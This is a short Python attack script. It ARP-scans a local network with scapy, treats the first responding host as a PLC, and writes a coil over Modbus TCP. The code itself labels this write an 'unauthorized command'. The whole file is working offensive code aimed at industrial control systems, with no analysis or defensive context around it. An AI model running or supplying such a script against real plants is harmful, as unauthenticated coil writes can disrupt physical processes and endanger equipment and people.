from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time

# Network Configuration (Modify this accordingly)
NETWORK_IP_RANGE = "192.168.1.0/24"  # Adjust this range to your actual network
PLC_PORT = 502  # Standard Modbus TCP port

def find_plc_ip():
    """Discover the PLC's IP address by scanning the network for active devices."""
    print("[*] Scanning network to find PLC...")
    
    # Create an ARP request packet
    arp_request = ARP(pdst=NETWORK_IP_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    # Send the packet and receive responses
    answered_list, _ = srp(packet, timeout=2, verbose=False)

    for sent, received in answered_list:
        print(f"[+] Found device: {received.psrc} ({received.hwsrc})")
        if received.psrc.startswith("192.168.1."):  # Adjust if needed
            return received.psrc

    print("[-] No PLC found in the network.")
    return None

def send_unauthorized_command(plc_ip):
    """Send an unauthorized Modbus command to the PLC."""
    print(f"[*] Attempting to connect to PLC at {plc_ip} on port {PLC_PORT}...")

    # Connect to the PLC
    client = ModbusClient(host=plc_ip, port=PLC_PORT, auto_open=True)

    if client.is_open():
        print("[+] Connection to PLC established.")

        # Example: Modify coil (boolean register) to enable an unauthorized action
        unauthorized_coil_address = 0  # Adjust to a relevant coil address
        unauthorized_value = 1  # 1 = ON, 0 = OFF

        print("[*] Sending unauthorized command...")
        success = client.write_single_coil(unauthorized_coil_address, unauthorized_value)

        if success:
            print("[+] Unauthorized command sent successfully!")
        else:
            print("[-] Failed to send unauthorized command.")

        # Close the connection
        client.close()
    else:
        print("[-] Failed to connect to PLC.")

def main():
    plc_ip = find_plc_ip()

    if plc_ip:
        send_unauthorized_command(plc_ip)
    else:
        print("[-] Could not determine PLC's IP. Exiting.")

if __name__ == "__main__":
    main()